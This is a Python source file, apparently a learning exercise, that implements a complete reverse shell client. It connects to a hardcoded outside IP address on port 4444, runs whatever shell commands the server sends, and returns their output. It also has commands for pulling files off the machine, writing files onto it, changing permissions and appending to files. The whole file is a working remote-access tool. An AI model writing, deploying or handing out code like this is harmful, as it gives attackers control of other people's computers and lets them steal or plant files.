import socket
import signal
import os
import subprocess

s = socket.socket() # client computer can connect to others

# ip address of server
# spin up the server with `nc -l localhost 4444``
host = "129.21.49.61"
port = 4444

# open a socket to the server
s.connect((host, port))

def closeServer():
  # close connection (won't get reached bc of while loop, but that's okay this is good habit)
  s.close()
  exit(0)

# handle graceful socket closing on SIGTERM
signal.signal(signal.SIGTERM, closeServer)

# infinite loop for continuous listening for server's commands
while True:
  # get the command input from server
  data = s.recv(1024)
  # handle the server telling the client to exit
  if data[:4].decode("utf-8") == 'exit':
    s.send(str.encode("OK"))
    s.close()
    exit(0)

  # the `cd` command is special, we need to change python's context
  if data[:2].decode("utf-8") == 'cd':
    try:
      os.chdir(data[3:].decode("utf-8"))
      s.send(str.encode(os.getcwd()))
    except FileNotFoundError:
      s.send(str.encode("Dir does not exist"))
    continue

  if data[:2].decode("utf-8") == 'DL':
    try:
      with open(data[3:].decode("utf-8"), "rb") as file:
        data = file.read(1024)
        while data:
          print("Send")
          s.send(data)
          resp = str(s.recv(1024),"utf-8")
          data = file.read(1024)
        s.send(str.encode("DONE"))
    except:
      s.send(str.encode("ERR"))
    continue

  if data[:2].decode("utf-8") == 'UP':
    try:
      with open(data[3:].decode("utf-8"), "wb") as file:
        s.send(str.encode("READY"))
        data = s.recv(1024)
        while data != b'DONE':
          file.write(data)
          s.send(str.encode("ACK"))
          data = s.recv(1024)
        s.send(str.encode("DONE"))
    except:
      s.send(str.encode("ERR"))
    continue
 
  if data[:5].decode("utf-8") == 'chmod':
    try:
      args = data.decode("utf-8").split()
      perms = oct(int(args[1],8))
      os.chmod(args[2], perms)
    except Exception:
      pass
    s.send(str.encode("OK"))
    continue

  if data[:3].decode('utf-8') == 'APP':
    args = data.decode('utf-8').split(" ")
    with open(args[-1],"a") as file:
      file.write(" ".join(args[1:-1]) + "\n")
    s.send(str.encode("Appended!"))
    continue

  # check if there are actually data/commands received (that is not cd)
  if len(data) > 0:
    # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
    # bytes and string versions of results
    output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
    output_str = str(output_bytes, "utf-8") # plain old basic string
    # send the command output back to the server
    s.send(str.encode(output_str))
  
